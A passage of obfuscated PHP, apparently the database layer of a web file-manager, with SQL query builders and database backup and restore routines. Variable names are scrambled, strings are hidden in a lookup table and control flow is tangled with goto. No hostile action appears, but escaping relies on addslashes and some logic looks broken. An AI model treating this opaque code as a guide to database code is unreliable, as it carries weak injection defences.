$f¥è…ñ…®[809] . $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $this->exp[$dñ¤Øêº¬] . $f¥è…ñ…®[50] . $this->parseValue($Dòª˜ã›¡¬[0]) . $f¥è…ñ…®[912] . $this->parseValue($Dòª˜ã›¡¬[1]) . $f¥è…ñ…®[266]; } else { think_exception(think_lang($f¥è…ñ…®[915]) . $f¥è…ñ…®[4] . $b ŠÊÉ²ªè[0]); } } else { $cÖ˜¢Á¼” = count($b ŠÊÉ²ªè); $D‚ŒÜ­±É = isset($b ŠÊÉ²ªè[$cÖ˜¢Á¼” - 1]) ? strtoupper($b ŠÊÉ²ªè[$cÖ˜¢Á¼” - 1]) : $f¥è…ñ…®[33]; if (in_array($D‚ŒÜ­±É, array($f¥è…ñ…®[909], $f¥è…ñ…®[910], $f¥è…ñ…®[911]))) { $cÖ˜¢Á¼” = $cÖ˜¢Á¼” - 1; } else { $D‚ŒÜ­±É = $f¥è…ñ…®[909]; } for ($B¢ƒ¤ÎÛ‹¿ = 0; $B¢ƒ¤ÎÛ‹¿ < $cÖ˜¢Á¼”; $B¢ƒ¤ÎÛ‹¿++) { $Dòª˜ã›¡¬ = is_array($b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿]) ? $b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿][1] : $b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿]; if ($f¥è…ñ…®[285] == strtolower($b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿][0])) { $aó•¼Š‘  .= $f¥è…ñ…®[248] . $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $Dòª˜ã›¡¬ . $f¥è…ñ…®[926] . $D‚ŒÜ­±É . $f¥è…ñ…®[50]; } else { $FŞö«á¯ÇÛ = is_array($b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿]) ? $this->exp[strtolower($b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿][0])] : $f¥è…ñ…®[901]; if (!$FŞö«á¯ÇÛ && is_array($b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿]) && in_array($b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿][0], array($f¥è…ñ…®[901], $f¥è…ñ…®[919], $f¥è…ñ…®[920], $f¥è…ñ…®[921], $f¥è…ñ…®[922], $f¥è…ñ…®[923]))) { $FŞö«á¯ÇÛ = $b ŠÊÉ²ªè[$B¢ƒ¤ÎÛ‹¿][0]; } $aó•¼Š‘  .= $f¥è…ñ…®[248] . $fòÄïÇÅÕ . $f¥è…ñ…®[50] . $FŞö«á¯ÇÛ . $f¥è…ñ…®[50] . $this->parseValue($Dòª˜ã›¡¬) . $f¥è…ñ…®[926] . $D‚ŒÜ­±É . $f¥è…ñ…®[50]; } } $aó•¼Š‘  = substr($aó•¼Š‘ , 0, -4); } } else { $aó•¼Š‘  .= $fòÄïÇÅÕ . $f¥è…ñ…®[929] . $this->parseValue($b ŠÊÉ²ªè); } return $aó•¼Š‘ ; } protected function parseThinkWhere($a†Äˆé‚ï‡, $Fšº‹¤©œ) { $AËÁ¾»ó¨Š =& $_SERVER[îÖ]; $Eô¦§¼Ï‰Ü = $AËÁ¾»ó¨Š[33]; switch ($a†Äˆé‚ï‡) { case $AËÁ¾»ó¨Š[339]: $Eô¦§¼Ï‰Ü = $Fšº‹¤©œ; break; case $AËÁ¾»ó¨Š[913]: $Eô¦§¼Ï‰Ü = is_string($Fšº‹¤©œ) ? $Fšº‹¤©œ : substr($this->parseWhere($Fšº‹¤©œ), 6); break; case $AËÁ¾»ó¨Š[930]: parse_str($Fšº‹¤©œ, $D³·»íÍ—); if (isset($D³·»íÍ—[$AËÁ¾»ó¨Š[908]])) { $A’êóì§‚ = $AËÁ¾»ó¨Š[50] . strtoupper($D³·»íÍ—[$AËÁ¾»ó¨Š[908]]) . $AËÁ¾»ó¨Š[50]; unset($D³·»íÍ—[$AËÁ¾»ó¨Š[908]]); } else { $A’êóì§‚ = $AËÁ¾»ó¨Š[912]; } $Dù’Ø”‰ = array(); foreach ($D³·»íÍ— as $AíøÆîÏµ¹ => $DÚ‹¾†¸) { $Dù’Ø”‰[] = $this->parseKey($AíøÆîÏµ¹) . $AËÁ¾»ó¨Š[929] . $this->parseValue($DÚ‹¾†¸); } $Eô¦§¼Ï‰Ü = implode($A’êóì§‚, $Dù’Ø”‰); break; } return $Eô¦§¼Ï‰Ü; } protected function parseLimit($C²”‘µ¢ƒ­) { $E‘Ü¿Ûàòù =& $_SERVER[îÖ]; return !empty($C²”‘µ¢ƒ­) ? $E‘Ü¿Ûàòù[48] . $C²”‘µ¢ƒ­ . $E‘Ü¿Ûàòù[50] : $E‘Ü¿Ûàòù[33]; } protected function parseJoin($cóÛ§¶ğ‘) { $F¹Ö ÈÀ¾Ö =& $_SERVER[îÖ]; $díØ‰Ç˜ŞŒ = $F¹Ö ÈÀ¾Ö[33]; if (!empty($cóÛ§¶ğ‘)) { if (is_array($cóÛ§¶ğ‘)) { foreach ($cóÛ§¶ğ‘ as $fŒ´‹í…âŠ => $DÁ¤Òíí™‘) { if (!1 !== stripos($DÁ¤Òíí™‘, $F¹Ö ÈÀ¾Ö[931])) { $díØ‰Ç˜ŞŒ .= $F¹Ö ÈÀ¾Ö[50] . $DÁ¤Òíí™‘; } else { $díØ‰Ç˜ŞŒ .= $F¹Ö ÈÀ¾Ö[932] . $DÁ¤Òíí™‘; } } } else { $díØ‰Ç˜ŞŒ .= $F¹Ö ÈÀ¾Ö[932] . $cóÛ§¶ğ‘; } } $díØ‰Ç˜ŞŒ = preg_replace($F¹Ö ÈÀ¾Ö[933], think_config($F¹Ö ÈÀ¾Ö[836]) . $F¹Ö ÈÀ¾Ö[934], $díØ‰Ç˜ŞŒ); return $díØ‰Ç˜ŞŒ; } protected function parseOrder($eæóñƒ÷œŠ) { $f²Â‰êÑ• =& $_SERVER[îÖ]; if (is_array($eæóñƒ÷œŠ)) { $F¯Ê¯Á­Û = array(); foreach ($eæóñƒ÷œŠ as $D‡ˆ“«„– => $Cåß¨ï½¦) { if (is_numeric($D‡ˆ“«„–)) { $F¯Ê¯Á­Û[] = $this->parseKey($Cåß¨ï½¦); } else { $Cåß¨ï½¦ = in_array(strtoupper(trim($Cåß¨ï½¦)), array($f²Â‰êÑ•[935], $f²Â‰êÑ•[936])) ? $f²Â‰êÑ•[50] . $Cåß¨ï½¦ : $f²Â‰êÑ•[33]; if (preg_match($f²Â‰êÑ•[937], $D‡ˆ“«„–)) { $F¯Ê¯Á­Û[] = $this->parseKey($D‡ˆ“«„–) . $Cåß¨ï½¦; } else { think_exception($f²Â‰êÑ•[938] . $D‡ˆ“«„–); } } } $eæóñƒ÷œŠ = implode($f²Â‰êÑ•[47], $F¯Ê¯Á­Û); } return !empty($eæóñƒ÷œŠ) ? $f²Â‰êÑ•[939] . $eæóñƒ÷œŠ : $f²Â‰êÑ•[33]; } protected function parseGroup($A¢Åë¦Î Õ) { $A¤Ş¤ŞÀê™ =& $_SERVER[îÖ]; return !empty($A¢Åë¦Î Õ) ? $A¤Ş¤ŞÀê™[940] . $A¢Åë¦Î Õ : $A¤Ş¤ŞÀê™[33]; } protected function parseHaving($DìãĞâ¸á) { $eÁ‚Îà®¿È =& $_SERVER[îÖ]; return !empty($DìãĞâ¸á) ? $eÁ‚Îà®¿È[941] . $DìãĞâ¸á : $eÁ‚Îà®¿È[33]; } protected function parseComment($bÍÄ½áêÕ‡) { $Fïê½Ô¡Ïİ =& $_SERVER[îÖ]; return !empty($bÍÄ½áêÕ‡) ? $Fïê½Ô¡Ïİ[942] . $bÍÄ½áêÕ‡ . $Fïê½Ô¡Ïİ[943] : $Fïê½Ô¡Ïİ[33]; } protected function parseDistinct($c¢³ÊíàÎ) { $EŞ¡‹Ä£·Æ =& $_SERVER[îÖ]; return !empty($c¢³ÊíàÎ) ? $EŞ¡‹Ä£·Æ[944] : $EŞ¡‹Ä£·Æ[33]; } protected function parseUnion($DŞ…Œ©¾·î) { $D‰«‚İåÒ =& $_SERVER[îÖ]; if (empty($DŞ…Œ©¾·î)) { return $D‰«‚İåÒ[33]; } if (isset($DŞ…Œ©¾·î[$D‰«‚İåÒ[336]])) { $dƒ¬—â¿…Ú = $D‰«‚İåÒ[945]; unset($DŞ…Œ©¾·î[$D‰«‚İåÒ[336]]); } else { $dƒ¬—â¿…Ú = $D‰«‚İåÒ[946]; } foreach ($DŞ…Œ©¾·î as $d‹©“±·ãê) { $EàÎ½¤²ô[] = $dƒ¬—â¿…Ú . (is_array($d‹©“±·ãê) ? $this->buildSelectSql($d‹©“±·ãê) : $d‹©“±·ãê); } return implode($D‰«‚İåÒ[50], $EàÎ½¤²ô); } public function insert($ešÙ¡òµ¤Ù, $e©¨½›º³Û = array(), $cñ‡¦³ÊóÂ = false) { goto f’Ò¶…öÔŸ; f’Ò¶…öÔŸ: $Cà Ğ¼“°å =& $_SERVER[îÖ]; $Bëõ“‰ª²Û = $F—¡Çò’ = array(); $this->model = $e©¨½›º³Û[$Cà Ğ¼“°å[269]]; goto A£ÇÜ¤£¬É; A£ÇÜ¤£¬É: foreach ($ešÙ¡òµ¤Ù as $C–³®ã‹¥è => $cŞÏÆé‚­Ó) { if (is_array($cŞÏÆé‚­Ó) && $Cà Ğ¼“°å[285] == $cŞÏÆé‚­Ó[0]) { $F—¡Çò’[] = $this->parseKey($C–³®ã‹¥è); $Bëõ“‰ª²Û[] = $cŞÏÆé‚­Ó[1]; } elseif (is_scalar($cŞÏÆé‚­Ó) || is_null($cŞÏÆé‚­Ó)) { $F—¡Çò’[] = $this->parseKey($C–³®ã‹¥è); $Bëõ“‰ª²Û[] = $this->parseValue($cŞÏÆé‚­Ó); } } $dŸëÆŠ§èÒ = ($cñ‡¦³ÊóÂ ? $Cà Ğ¼“°å[813] : $Cà Ğ¼“°å[814]) . $Cà Ğ¼“°å[815] . $this->parseTable($e©¨½›º³Û[$Cà Ğ¼“°å[267]]) . $Cà Ğ¼“°å[809] . implode($Cà Ğ¼“°å[47], $F—¡Çò’) . $Cà Ğ¼“°å[810] . implode($Cà Ğ¼“°å[47], $Bëõ“‰ª²Û) . $Cà Ğ¼“°å[811]; $dŸëÆŠ§èÒ .= $this->parseLock(isset($e©¨½›º³Û[$Cà Ğ¼“°å[771]]) ? $e©¨½›º³Û[$Cà Ğ¼“°å[771]] : !1); goto EçŸ»•°ƒ¸; EçŸ»•°ƒ¸: $dŸëÆŠ§èÒ .= $this->parseComment(!empty($e©¨½›º³Û[$Cà Ğ¼“°å[341]]) ? $e©¨½›º³Û[$Cà Ğ¼“°å[341]] : $Cà Ğ¼“°å[33]); return $this->execute($dŸëÆŠ§èÒ, $this->parseBind(!empty($e©¨½›º³Û[$Cà Ğ¼“°å[273]]) ? $e©¨½›º³Û[$Cà Ğ¼“°å[273]] : array())); goto EÈÇÛæ¤Ş; EÈÇÛæ¤Ş: } public function selectInsert($E¹¸‹ÕÂ£, $bİŒÌ ¨ÓÛ, $a³‰§ÒÎè§ = array()) { goto AÇØˆ“°…; CÃĞ³ë‰¢ƒ: array_walk($E¹¸‹ÕÂ£, array($this, $C‰Â›Ã‚Çå[812])); $a•Ñğ„²® = $C‰Â›Ã‚Çå[947] . $this->parseTable($bİŒÌ ¨ÓÛ) . $C‰Â›Ã‚Çå[809] . implode($C‰Â›Ã‚Çå[47], $E¹¸‹ÕÂ£) . $C‰Â›Ã‚Çå[926]; $a•Ñğ„²® .= $this->buildSelectSql($a³‰§ÒÎè§); goto a“éôÃ£†; a“éôÃ£†: return $this->execute($a•Ñğ„²®, $this->parseBind(!empty($a³‰§ÒÎè§[$C‰Â›Ã‚Çå[273]]) ? $a³‰§ÒÎè§[$C‰Â›Ã‚Çå[273]] : array())); goto b¨öù½›ÈÜ; AÇØˆ“°…: $C‰Â›Ã‚Çå =& $_SERVER[îÖ]; $this->model = $a³‰§ÒÎè§[$C‰Â›Ã‚Çå[269]]; if (is_string($E¹¸‹ÕÂ£)) { $E¹¸‹ÕÂ£ = explode($C‰Â›Ã‚Çå[47], $E¹¸‹ÕÂ£); } goto CÃĞ³ë‰¢ƒ; b¨öù½›ÈÜ: } public function update($AØ§æÖ‹, $B±§¨áÌª) { $Eèò‘¤× =& $_SERVER[îÖ]; $this->model = $B±§¨áÌª[$Eèò‘¤×[269]]; $e¨ÃºÖçÖ = $Eèò‘¤×[948] . $this->parseTable($B±§¨áÌª[$Eèò‘¤×[267]]) . $this->parseSet($AØ§æÖ‹) . $this->parseWhere(!empty($B±§¨áÌª[$Eèò‘¤×[263]]) ? $B±§¨áÌª[$Eèò‘¤×[263]] : $Eèò‘¤×[33]) . $this->parseOrder(!empty($B±§¨áÌª[$Eèò‘¤×[350]]) ? $B±§¨áÌª[$Eèò‘¤×[350]] : $Eèò‘¤×[33]) . $this->parseLimit(!empty($B±§¨áÌª[$Eèò‘¤×[280]]) ? $B±§¨áÌª[$Eèò‘¤×[280]] : $Eèò‘¤×[33]) . $this->parseLock(isset($B±§¨áÌª[$Eèò‘¤×[771]]) ? $B±§¨áÌª[$Eèò‘¤×[771]] : !1) . $this->parseComment(!empty($B±§¨áÌª[$Eèò‘¤×[341]]) ? $B±§¨áÌª[$Eèò‘¤×[341]] : $Eèò‘¤×[33]); return $this->execute($e¨ÃºÖçÖ, $this->parseBind(!empty($B±§¨áÌª[$Eèò‘¤×[273]]) ? $B±§¨áÌª[$Eèò‘¤×[273]] : array())); } public function delete($d’À‚¿™ä = array()) { $Cµ“ö¥±³¥ =& $_SERVER[îÖ]; $this->model = $d’À‚¿™ä[$Cµ“ö¥±³¥[269]]; $cÏ÷‚ù¥ºÙ = $Cµ“ö¥±³¥[949] . $this->parseTable($d’À‚¿™ä[$Cµ“ö¥±³¥[267]]) . $this->parseWhere(!empty($d’À‚¿™ä[$Cµ“ö¥±³¥[263]]) ? $d’À‚¿™ä[$Cµ“ö¥±³¥[263]] : $Cµ“ö¥±³¥[33]) . $this->parseOrder(!empty($d’À‚¿™ä[$Cµ“ö¥±³¥[350]]) ? $d’À‚¿™ä[$Cµ“ö¥±³¥[350]] : $Cµ“ö¥±³¥[33]) . $this->parseLimit(!empty($d’À‚¿™ä[$Cµ“ö¥±³¥[280]]) ? $d’À‚¿™ä[$Cµ“ö¥±³¥[280]] : $Cµ“ö¥±³¥[33]) . $this->parseLock(isset($d’À‚¿™ä[$Cµ“ö¥±³¥[771]]) ? $d’À‚¿™ä[$Cµ“ö¥±³¥[771]] : !1) . $this->parseComment(!empty($d’À‚¿™ä[$Cµ“ö¥±³¥[341]]) ? $d’À‚¿™ä[$Cµ“ö¥±³¥[341]] : $Cµ“ö¥±³¥[33]); return $this->execute($cÏ÷‚ù¥ºÙ, $this->parseBind(!empty($d’À‚¿™ä[$Cµ“ö¥±³¥[273]]) ? $d’À‚¿™ä[$Cµ“ö¥±³¥[273]] : array())); } public function select($aÍŒ‹ùó = array()) { goto AÓÍÍğ¬ê¡; AÓÍÍğ¬ê¡: $däÃãÌèŞ‘ =& $_SERVER[îÖ]; $this->model = $aÍŒ‹ùó[$däÃãÌèŞ‘[269]]; $a«ÔÒè¤Ğß = $this->buildSelectSql($aÍŒ‹ùó); goto Aæ¡ë¡ëÄ; eÛ†“‹ÀŞÏ: if ($F°ÕŒØßÏ× && !1 !== $e¦†ÊêÁçî) { think_cache($dÜØ »Ïö¡, $e¦†ÊêÁçî, $F°ÕŒØßÏ×); } return $e¦†ÊêÁçî; goto cÖåÛ¿ƒğ; Aæ¡ë¡ëÄ: $F°ÕŒØßÏ× = isset($aÍŒ‹ùó[$däÃãÌèŞ‘[337]]) ? $aÍŒ‹ùó[$däÃãÌèŞ‘[337]] : !1; if ($F°ÕŒØßÏ×) { $dÜØ »Ïö¡ = is_string($F°ÕŒØßÏ×[$däÃãÌèŞ‘[89]]) ? $F°ÕŒØßÏ×[$däÃãÌèŞ‘[89]] : $däÃãÌèŞ‘[950] . md5($a«ÔÒè¤Ğß); $Cé„ì¹Æ« = think_cache($dÜØ »Ïö¡, $däÃãÌèŞ‘[33], $F°ÕŒØßÏ×); if (!1 !== $Cé„ì¹Æ«) { return $Cé„ì¹Æ«; } } $e¦†ÊêÁçî = $this->query($a«ÔÒè¤Ğß, $this->parseBind(!empty($aÍŒ‹ùó[$däÃãÌèŞ‘[273]]) ? $aÍŒ‹ùó[$däÃãÌèŞ‘[273]] : array())); goto eÛ†“‹ÀŞÏ; cÖåÛ¿ƒğ: } public function buildSelectSql($dÓˆ®¿Ø® = array()) { goto a¯áˆğø; a¯áˆğø: $EøÀ‘ïàœî =& $_SERVER[îÖ]; if (isset($dÓˆ®¿Ø®[$EøÀ‘ïàœî[340]])) { if (strpos($dÓˆ®¿Ø®[$EøÀ‘ïàœî[340]], $EøÀ‘ïàœî[47])) { list($fÛÑŞË‰¹—, $F¦ ˆèÄ±) = explode($EøÀ‘ïàœî[47], $dÓˆ®¿Ø®[$EøÀ‘ïàœî[340]]); } else { $fÛÑŞË‰¹— = $dÓˆ®¿Ø®[$EøÀ‘ïàœî[340]]; } $fÛÑŞË‰¹— = $fÛÑŞË‰¹— ? $fÛÑŞË‰¹— : 1; $F¦ ˆèÄ± = isset($F¦ ˆèÄ±) ? $F¦ ˆèÄ± : (is_numeric($dÓˆ®¿Ø®[$EøÀ‘ïàœî[280]]) ? $dÓˆ®¿Ø®[$EøÀ‘ïàœî[280]] : 20); $AÔ¨ã¡ô¼ = $F¦ ˆèÄ± * ((int) $fÛÑŞË‰¹— - 1); $dÓˆ®¿Ø®[$EøÀ‘ïàœî[280]] = $AÔ¨ã¡ô¼ . $EøÀ‘ïàœî[47] . $F¦ ˆèÄ±; } if (think_config($EøÀ‘ïàœî[951])) { $BøŠŠªŒ° = $EøÀ‘ïàœî[952] . md5(serialize($dÓˆ®¿Ø®)); $AÍ–ğ´åÚë = think_cache($BøŠŠªŒ°); if ($AÍ–ğ´åÚë) { return $AÍ–ğ´åÚë; } } goto eõÈ»ñ°Ô; f…æ®œ¼—: return $båÈ©›°í«; goto BÌºÄÎ³‡¬; eõÈ»ñ°Ô: $båÈ©›°í« = $this->parseSql($this->selectSql, $dÓˆ®¿Ø®); $båÈ©›°í« .= $this->parseLock(isset($dÓˆ®¿Ø®[$EøÀ‘ïàœî[771]]) ? $dÓˆ®¿Ø®[$EøÀ‘ïàœî[771]] : !1); if (isset($BøŠŠªŒ°)) { think_cache($BøŠŠªŒ°, $båÈ©›°í«); } goto f…æ®œ¼—; BÌºÄÎ³‡¬: } public function parseSql($f¦Îê”ùˆø, $cí…¾µ´ · = array()) { $B‘¤ÙØÔê‡ =& $_SERVER[îÖ]; $f¦Îê”ùˆø = str_replace(array($B‘¤ÙØÔê‡[953], $B‘¤ÙØÔê‡[954], $B‘¤ÙØÔê‡[955], $B‘¤ÙØÔê‡[956], $B‘¤ÙØÔê‡[957], $B‘¤ÙØÔê‡[958], $B‘¤ÙØÔê‡[959], $B‘¤ÙØÔê‡[960], $B‘¤ÙØÔê‡[961], $B‘¤ÙØÔê‡[962], $B‘¤ÙØÔê‡[963]), array($this->parseTable("{$cí…¾µ´ ·[$B‘¤ÙØÔê‡[267]]}"), $this->parseDistinct(isset($cí…¾µ´ ·[$B‘¤ÙØÔê‡[964]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[964]] : !1), $this->parseField(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[261]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[261]] : $B‘¤ÙØÔê‡[176]), $this->parseJoin(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[270]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[270]] : $B‘¤ÙØÔê‡[33]), $this->parseWhere(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[263]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[263]] : $B‘¤ÙØÔê‡[33]), $this->parseGroup(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[965]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[965]] : $B‘¤ÙØÔê‡[33]), $this->parseHaving(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[966]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[966]] : $B‘¤ÙØÔê‡[33]), $this->parseOrder(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[350]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[350]] : $B‘¤ÙØÔê‡[33]), $this->parseLimit(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[280]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[280]] : $B‘¤ÙØÔê‡[33]), $this->parseUnion(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[335]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[335]] : $B‘¤ÙØÔê‡[33]), $this->parseComment(!empty($cí…¾µ´ ·[$B‘¤ÙØÔê‡[341]]) ? $cí…¾µ´ ·[$B‘¤ÙØÔê‡[341]] : $B‘¤ÙØÔê‡[33])), $f¦Îê”ùˆø); return $f¦Îê”ùˆø; } public function getLastSql($e—µÓ«ø™Ë = '') { return $e—µÓ«ø™Ë ? $this->modelSql[$e—µÓ«ø™Ë] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($E™’œø„”é) { return addslashes($E™’œø„”é); } public function setModel($d·²º«“) { $this->model = $d·²º«“; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($dõñ¬Ô¶Üä, $aî§³š¿åˆ = '') { $this->database = $dõñ¬Ô¶Üä; $this->type = $aî§³š¿åˆ; } public function model($DñË¶ŞŒô» = '') { return new ModelBase($DñË¶ŞŒô», $_SERVER[îÖ][33], $this->database); } public function db($b¿ù‡Ñ„¤á = false) { goto eèÙÃŸÂ¿; cÙ®ì‰ƒ—: if (!$fêÀÊŒšÜ¤) { $f¯ğö£Ü’ô->execute("\x63\162\x65\x61\x74\145\x20\144\141\x74\x61\x62\141\x73\145\x20\x60{$F»Á‘—ëÕ}\140"); } $c“ˆæ»¢[$EÄ·Î–¸ë[879]] = $F»Á‘—ëÕ; if ($c“ˆæ»¢[$EÄ·Î–¸ë[722]] == $EÄ·Î–¸ë[723]) { $c“ˆæ»¢[$EÄ·Î–¸ë[724]] .= $EÄ·Î–¸ë[967] . $F»Á‘—ëÕ; } goto AîàŸ¶¢ô; c†ËˆØÕÉ‡: $F»Á‘—ëÕ = $c“ˆæ»¢[$EÄ·Î–¸ë[879]]; $c“ˆæ»¢[$EÄ·Î–¸ë[879]] = $EÄ·Î–¸ë[33]; if ($c“ˆæ»¢[$EÄ·Î–¸ë[722]] == $EÄ·Î–¸ë[723]) { $B÷‚ãäİœç = $c“ˆæ»¢[$EÄ·Î–¸ë[724]]; $c“ˆæ»¢[$EÄ·Î–¸ë[724]] = substr($B÷‚ãäİœç, 0, strrpos($B÷‚ãäİœç, $EÄ·Î–¸ë[967])); } goto aÈŒ½ô‘»; eèÙÃŸÂ¿: $EÄ·Î–¸ë =& $_SERVER[îÖ]; $c“ˆæ»¢ = array_change_key_case($this->database); if ($this->type == $EÄ·Î–¸ë[9] || !$b¿ù‡Ñ„¤á) { return $this->model()->db(); } goto c†ËˆØÕÉ‡; aÈŒ½ô‘»: $this->database = $c“ˆæ»¢; $f¯ğö£Ü’ô = $this->model()->db(); try { $fêÀÊŒšÜ¤ = $f¯ğö£Ü’ô->execute("\163\x68\x6f\x77\40\144\x61\164\x61\142\x61\163\x65\163\x20\x6c\x69\x6b\x65\x20\x27{$F»Á‘—ëÕ}\x27"); } catch (Exception $eâšìË¹Ò¦) { } goto cÙ®ì‰ƒ—; AîàŸ¶¢ô: $this->database = $c“ˆæ»¢; $f¯ğö£Ü’ô->execute("\x75\163\145\40\x60{$F»Á‘—ëÕ}\x60"); return $f¯ğö£Ü’ô; goto D’«œ¯ŒÍÔ; D’«œ¯ŒÍÔ: } public function createTable($cØíø éˆ¨, $CõÆŸé¯Ğ = null) { $eÊ³ä°İø¤ =& $_SERVER[îÖ]; if (!IO::exist($cØíø éˆ¨)) { show_json(LNG($eÊ³ä°İø¤[968]), !1); } $A‚µ‘‡é = sqlSplit(IO::getContent($cØíø éˆ¨)); foreach ($A‚µ‘‡é as $Aâ¨Ûáê¦š) { if ($CõÆŸé¯Ğ) { $f©ò¾ß¡ÔÍ = stripos($Aâ¨Ûáê¦š, $eÊ³ä°İø¤[969]) === 0; if ($f©ò¾ß¡ÔÍ) { $CõÆŸé¯Ğ->task[$eÊ³ä°İø¤[970]] += 1; } } $this->model()->db()->execute($Aâ¨Ûáê¦š); if ($CõÆŸé¯Ğ && $f©ò¾ß¡ÔÍ) { preg_match($eÊ³ä°İø¤[971], $Aâ¨Ûáê¦š, $a‘·˜ùÚùÁ); $CõÆŸé¯Ğ->task[$eÊ³ä°İø¤[972]] = $a‘·˜ùÚùÁ[1]; $CõÆŸé¯Ğ->update(1); } } $this->taskToCache($CõÆŸé¯Ğ); } public function insertTable($DÕµÛÂáÈÏ, $EŠ›‹¬º = null) { $Dö†–ªÅ =& $_SERVER[îÖ]; $c¸‰ÒÄä÷ = $this->model()->db(); $aê¹¤æ÷ª = $Aªåì²Î¬± ? array($Aªåì²Î¬±) : $c¸‰ÒÄä÷->getTables(); foreach ($DÕµÛÂáÈÏ as $E£ìÕòˆ°) { $Aªåì²Î¬± = basename($E£ìÕòˆ°, $Dö†–ªÅ[717]); if (!in_array($Aªåì²Î¬±, $aê¹¤æ÷ª)) { continue; } if ($EŠ›‹¬º) { $EŠ›‹¬º->task[$Dö†–ªÅ[972]] = $Aªåì²Î¬±; } if (get_filesize($E£ìÕòˆ°) == 0) { continue; } $EÕ…—¸êÉÏ = $this->sqlToDb($E£ìÕòˆ°, $EŠ›‹¬º); if (!$EÕ…—¸êÉÏ) { show_json(LNG($Dö†–ªÅ[973]) . "\x5b{$Aªåì²Î¬±}\135", !1); } } $this->taskToCache($EŠ›‹¬º); } public function sqlFromDb($AãØê¾‹¯®, $cÏÃØ—Áª¸, $a³íøØã« = null, $cÁŒİº½¶¸ = null) { goto cĞßØ×æô; CÊñâÇ¯Çà: $CÙˆ™…â“å = $Aö·é˜‘¶ß->getPk(); $dİŠäêÔêé = $Aö·é˜‘¶ß->getDbFields(); do { $f³»èÇÕ’ä = $Aö·é˜‘¶ß->field($dİŠäêÔêé)->order($CÙˆ™…â“å . $_SERVER[îÖ][975])->selectPage($Cğ¸ŠÚÕ, $CèÅÓçÖó ); $bùãÑøŒÅ = isset($f³»èÇÕ’ä[$_SERVER[îÖ][351]][$_SERVER[îÖ][353]]) ? $f³»èÇÕ’ä[$_SERVER[îÖ][351]][$_SERVER[îÖ][353]] : 0; $Eİ†Ÿôô”Œ = !empty($f³»èÇÕ’ä[$_SERVER[îÖ][354]]) ? $f³»èÇÕ’ä[$_SERVER[îÖ][354]] : array(); if (!($a’È™º£²í = count($Eİ†Ÿôô”Œ))) { break; } $bõØ‚¡·’œ = array(); foreach ($Eİ†Ÿôô”Œ as $c‡ô±Ò´ŒÑ) { if ($AãØê¾‹¯® == $_SERVER[îÖ][976] && $c‡ô±Ò´ŒÑ[$_SERVER[îÖ][29]] == $_SERVER[îÖ][977]) { $D¿ãŞÃÉÃõ = json_decode($c‡ô±Ò´ŒÑ[$_SERVER[îÖ][359]], !0); if ($D¿ãŞÃÉÃõ[$_SERVER[îÖ][28]] == date($_SERVER[îÖ][689]) && !$D¿ãŞÃÉÃõ[$_SERVER[îÖ][688]]) { continue; } } if ($cÁŒİº½¶¸) { $c‡ô±Ò´ŒÑ[$_SERVER[îÖ][75]] = "\x7b\151\157\72{$cÁŒİº½¶¸}\175" . substr($c‡ô±Ò´ŒÑ[$_SERVER[îÖ][75]], strlen("\x7b\x69\x6f\72{$c‡ô±Ò´ŒÑ[$_SERVER[îÖ][743]]}\x7d")); $c‡ô±Ò´ŒÑ[$_SERVER[îÖ][743]] = $cÁŒİº½¶¸; } $bõØ‚¡·’œ[] = $_SERVER[îÖ][978] . $this->sqlEncode($c‡ô±Ò´ŒÑ) . $_SERVER[îÖ][979]; } $CœôèçßÅè = "\x49\x4e\x53\x45\x52\124\x20\x49\x4e\124\x4f\40\x60{$AãØê¾‹¯®}\140\40\50\x60" . implode($_SERVER[îÖ][980], $dİŠäêÔêé) . $_SERVER[îÖ][981]; fwrite($c˜¶æò“¬Ö, $CœôèçßÅè . implode($_SERVER[îÖ][982], $bõØ‚¡·’œ) . $_SERVER[îÖ][67] . PHP_EOL); $CèÅÓçÖó ++; $c÷£ï‡©ÕÑ += $a’È™º£²í; if ($a³íøØã«) { $a³íøØã«->update($a’È™º£²í); } } while ($CèÅÓçÖó  <= $bùãÑøŒÅ); goto eÓ®ƒŸº—“; cĞßØ×æô: if ($a³íøØã«) { $a³íøØã«->task[$_SERVER[îÖ][972]] = $AãØê¾‹¯®; } $Aö·é˜‘¶ß = $this->model($AãØê¾‹¯®); $c÷£ï‡©ÕÑ = 0; goto aç¿¯Œ«; aç¿¯Œ«: $CèÅÓçÖó  = 1; $Cğ¸ŠÚÕ = 500; $c˜¶æò“¬Ö = fopen($cÏÃØ—Áª¸, $_SERVER[îÖ][974]); goto CÊñâÇ¯Çà; eÓ®ƒŸº—“: fclose($c˜¶æò“¬Ö); return $c÷£ï‡©ÕÑ; goto B«½šÃ‡ŞĞ; B«½šÃ‡ŞĞ: } public function sqlToDb($fŞö„Œ‰‹, $Bø÷çôß î = null) { goto Dù†Â·øĞ„; f¤Æ•ÌƒŞ¼: 